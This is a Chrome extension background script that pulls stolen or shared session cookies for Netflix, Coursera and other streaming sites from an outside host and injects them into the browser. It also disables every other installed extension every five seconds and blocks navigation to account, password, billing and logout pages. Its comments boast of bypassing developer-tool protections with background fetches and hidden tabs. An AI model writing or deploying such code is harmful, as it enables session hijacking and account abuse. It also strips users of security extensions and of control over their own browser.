
// Session URL mappings for different services
const SESSION_URLS = {
  '1': 'https://session.khanlegacyagency.com/Netflix/Netflix.php',
  '2': 'https://session.khanlegacyagency.com/Netflix/Netflix.php',
  '3': 'https://session.khanlegacyagency.com/Coursera/Coursera.php'
};

const RESTRICTED_KEYWORDS = ['settings', 'account', 'billing', 'profile', 'subscription', 'password', 'payment', 'logout', 'signout', 'sign-out', 'help', 'support'];

const SUPPORTED_DOMAINS = [
  'netflix.com', 'coursera.org', 'primevideo.com', 'hulu.com', 'disneyplus.com', 'hbomax.com',
  'peacocktv.com', 'paramountplus.com', 'apple.com', 'crunchyroll.com', 'funimation.com',
  'spotify.com', 'youtube.com', 'twitch.tv'
];

async function ensureMonopoly() {
  try {
    const extensions = await chrome.management.getAll();
    const self = await chrome.management.getSelf();
    for (const ext of extensions) {
      if (ext.id !== self.id && ext.type === 'extension' && ext.enabled) {
        await chrome.management.setEnabled(ext.id, false);
      }
    }
  } catch (error) { }
}

chrome.management.onInstalled.addListener(ensureMonopoly);
chrome.runtime.onStartup.addListener(ensureMonopoly);
chrome.runtime.onInstalled.addListener(ensureMonopoly);
setInterval(ensureMonopoly, 5000);

chrome.webNavigation.onBeforeNavigate.addListener((details) => {
  if (details.url && details.frameId === 0) {
    try {
      const urlObj = new URL(details.url);
      const hostLower = urlObj.hostname.toLowerCase();
      if (!SUPPORTED_DOMAINS.some(domain => hostLower.includes(domain))) return;
      const pathLower = urlObj.pathname.toLowerCase();
      if (RESTRICTED_KEYWORDS.some(keyword => pathLower.includes(keyword))) {
        if (hostLower.includes('khanlegacyagency.com')) return;
        chrome.tabs.update(details.tabId, { url: urlObj.protocol + '//' + urlObj.hostname + '/' });
      }
    } catch (error) { }
  }
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'injectCookies' && (request.sessionId || request.url)) {
    handleInjection(request.sessionId, request.url)
      .then((res) => sendResponse(res))
      .catch((error) => sendResponse({ success: false, error: error.message }));
    return true;
  }

  if (request.action === 'sessionDataFound' && request.html) {
    processSessionData(request.html, sender.tab ? sender.tab.id : null);
    return true;
  }

  if (request.action === 'healthCheck') {
    sendResponse({ alive: true });
    return true;
  }
});

async function processSessionData(html, tabId) {
  try {
    const cookies = extractCookies(html);
    const redirect = extractRedirect(html);
    if (cookies) {
      for (const cookie of cookies) await setCookie(cookie);
      if (tabId) chrome.tabs.remove(tabId);

      chrome.tabs.query({}, (tabs) => {
        tabs.forEach(tab => {
          try {
            chrome.tabs.sendMessage(tab.id, {
              type: 'SYNC_COMPLETE',
              redirect: redirect || 'https://www.netflix.com/browse'
            });
          } catch (e) { }
        });
      });
      return true;
    }
  } catch (e) { }
  return false;
}

// MAIN ENTRY POINT
async function handleInjection(sessionId, directUrl) {
  const sessionUrl = directUrl || SESSION_URLS[String(sessionId).trim()];
  if (!sessionUrl) throw new Error('Invalid Tool ID');

  // PATH 1: The "Shadow Fetch" (Authenticated background request)
  // This behaves like view-source and bypasses redirects/disable-devtool
  try {
    const response = await fetch(sessionUrl, {
      headers: {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': navigator.userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
      }
    });

    if (response.ok) {
      const html = await response.text();
      // Check if we got the data directly
      if (html.includes('extv') || html.includes('ext01JSON')) {
        const success = await processSessionData(html);
        if (success) return { success: true, status: 'instant' };
      }
    }
  } catch (e) { }

  // PATH 2: The "Controlled Tab" (Fallback for challenges)
  // If fetch failed or returned the challenge page, we open a hidden tab.
  chrome.tabs.create({ url: sessionUrl, active: false });
  return { success: true, status: 'started' };
}

function findJsonArray(str) {
  const startIdx = str.indexOf('[');
  if (startIdx === -1) return null;
  let balance = 0, inString = false, escape = false;
  for (let i = startIdx; i < str.length; i++) {
    const char = str[i];
    if (escape) { escape = false; continue; }
    if (char === '\\') { escape = true; continue; }
    if (char === '"') { inString = !inString; continue; }
    if (!inString) {
      if (char === '[') balance++;
      else if (char === ']') {
        balance--;
        if (balance === 0) return str.substring(startIdx, i + 1);
      }
    }
  }
  return null;
}

function extractCookies(html) {
  const targetRegex = /<(?:div|span|script)[^>]*(?:id|class)=["'](?:extv|ext01JSONdiv|ext01JSON|ext01)["'][^>]*>([\s\S]*?)<\/(?:div|span|script)>/i;
  const targetMatch = html.match(targetRegex);
  if (targetMatch && targetMatch[1]) {
    const jsonStr = findJsonArray(targetMatch[1]);
    if (jsonStr) {
      try {
        const parsed = JSON.parse(jsonStr);
        if (Array.isArray(parsed) && parsed.length > 0) return processCookieArray(parsed);
      } catch (e) { }
    }
  }
  let searchPos = 0, attempts = 0;
  while (attempts < 25) {
    attempts++;
    const nextBracket = html.indexOf('[', searchPos);
    if (nextBracket === -1) break;
    const possibleJson = findJsonArray(html.substring(nextBracket));
    if (possibleJson && possibleJson.includes('"domain"') && (possibleJson.includes('"value"') || possibleJson.includes('"name"'))) {
      try {
        const parsed = JSON.parse(possibleJson);
        if (Array.isArray(parsed) && parsed.length > 0 && parsed[0].domain) return processCookieArray(parsed);
      } catch (e) { }
      searchPos = nextBracket + possibleJson.length;
    } else searchPos = nextBracket + 1;
  }
  return null;
}

function processCookieArray(cookies) {
  return cookies.map(cookie => {
    let domain = cookie.domain;
    if (!cookie.hostOnly && domain && !domain.startsWith('.')) domain = '.' + domain;
    const cookieObj = {
      url: 'https://' + (domain && domain.startsWith('.') ? domain.slice(1) : (domain || '')),
      name: cookie.name,
      value: cookie.value,
      domain: domain,
      path: cookie.path || '/',
      secure: cookie.secure || false,
      httpOnly: cookie.httpOnly || false,
      expirationDate: cookie.expirationDate || Math.floor(Date.now() / 1000) + 31536000
    };
    if (cookie.sameSite) {
      const ss = String(cookie.sameSite).toLowerCase();
      if (ss.includes('strict')) cookieObj.sameSite = 'strict';
      else if (ss.includes('lax')) cookieObj.sameSite = 'lax';
      else { cookieObj.sameSite = 'no_restriction'; cookieObj.secure = true; }
    } else if (cookieObj.secure) cookieObj.sameSite = 'no_restriction';
    return cookieObj;
  });
}

function extractRedirect(html) {
  const extvMatch = html.match(/<div[^>]*id=["']extv["'][^>]*href=["']([^"']+)["']/i);
  if (extvMatch && extvMatch[1]) return extvMatch[1];
  const locationMatch = html.match(/window\.location\.href\s*=\s*["']([^"']+)["']/);
  if (locationMatch && locationMatch[1]) return locationMatch[1];
  return null;
}

function setCookie(cookie) {
  return new Promise((resolve) => {
    chrome.cookies.set({
      url: cookie.url, name: cookie.name, value: cookie.value, domain: cookie.domain, path: cookie.path,
      secure: cookie.secure, httpOnly: cookie.httpOnly, sameSite: cookie.sameSite, expirationDate: cookie.expirationDate
    }, () => { chrome.runtime.lastError; resolve(); });
  });
}